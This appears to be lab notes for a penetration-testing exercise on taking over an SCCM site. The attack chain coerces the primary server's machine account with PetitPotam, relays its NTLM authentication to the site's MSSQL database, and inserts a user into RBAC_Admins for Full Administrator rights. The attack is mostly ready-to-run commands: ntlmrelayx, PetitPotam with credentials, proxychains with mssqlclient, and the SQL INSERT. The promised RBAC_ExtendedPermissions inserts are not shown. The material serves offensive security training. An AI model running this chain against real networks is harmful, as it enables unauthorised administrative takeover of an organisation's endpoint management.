# 17.15 SCCM Site Takeover I NTLM Relay to MSSQL Site Database

> Coerce SCCM01$ via PetitPotam/DDR, relay to the site MSSQL, then INSERT into `RBAC_Admins` + `RBAC_ExtendedPermissions` for Full Admin.

## Overview

When the SCCM Primary Server machine account is a local admin on the site database server, relay its NTLM authentication (coerced via PetitPotam or DDR enrollment) to the MSSQL service. Connect as SCCM01$ via proxychains/mssqlclient and write blwasp into RBAC_Admins + RBAC_ExtendedPermissions to gain Full Administrator in SCCM.

## Steps

- Set up ntlmrelayx targeting mssql://172.50.0.30 with -socks to create a SOCKS session
- Coerce SCCM01$ authentication with PetitPotam pointing to the attacker as listener
- Connect to the relayed MSSQL session via proxychains4 + mssqlclient.py -windows-auth -no-pass
- USE CM_HTB; get blwasp's binary SID via PowerView + custom Convert-StringSidToBinary function
- INSERT blwasp into RBAC_Admins; INSERT three rows into RBAC_ExtendedPermissions (SMS0001R for SMS00ALL/SMS00001/SMS00004)
- Verify with sccmhunter.py admin -u blwasp -p Password123! -ip 172.50.0.40 then show_admins

## Commands

### Setup ntlmrelayx for MSSQL relay

```bash
python3 examples/ntlmrelayx.py -t "mssql://172.50.0.30" -smb2support -socks
```

### Coerce SCCM01$ auth via PetitPotam

```bash
python3 PetitPotam.py -u BlWasp -p 'Password123!' -d 'lab.local' 10.10.14.207 172.50.0.21
```

### Connect via proxychains

```bash
proxychains4 -q python3 examples/mssqlclient.py 'LAB/SCCM01$'@172.50.0.30 -windows-auth -no-pass
```

### Get blwasp SID + convert to binary

```powershell
Import-Module .\PowerView.ps1
```

### Write blwasp as SCCM Full Admin via MSSQL

```sql
SQL (LAB\SCCM01$  dbo@CM_HTB)> INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x0105000000000005150000004b2233992a9592e91111a99da4f040000,'LAB\blwasp',0,0,'','','','','HTB');
```
